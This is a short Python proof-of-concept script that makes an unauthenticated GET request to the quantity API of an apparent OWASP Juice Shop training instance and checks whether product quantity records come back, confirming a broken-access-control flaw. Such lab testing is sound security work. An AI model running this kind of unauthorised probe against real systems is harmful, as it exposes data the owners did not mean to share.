import httpx
import json

# Target URL for the vulnerable endpoint
url = "http://juice-shop:3000/api/Quantitys/"

try:
    # Make unauthenticated GET request to the quantity data endpoint
    response = httpx.get(url)

    # Print status code and response details
    print(f"Status Code: {response.status_code}")
    print(f"Response Headers: {dict(response.headers)}")

    # Check if we got quantity data
    if response.status_code == 200:
        try:
            data = response.json()
            print(f"Response Body Preview: {json.dumps(data)[:200]}...")

            # Verify we got the expected quantity data structure
            if "status" in data and "data" in data and isinstance(data["data"], list):
                if len(data["data"]) > 0 and "ProductId" in data["data"][0]:
                    print("\n[SUCCESS] Unauthorized access to quantity data confirmed!")
                    print(f"Retrieved {len(data['data'])} quantity records")
                    print(f"First record ProductId: {data['data'][0]['ProductId']}")
                else:
                    print("[PARTIAL] Response structure doesn't match expected format")
            else:
                print("[PARTIAL] Unexpected response structure")
        except ValueError:
            print("[ERROR] Response is not valid JSON")
    else:
        print(f"[FAIL] Expected 200 status code, got {response.status_code}")

except Exception as e:
    print(f"[ERROR] Request failed: {str(e)}")
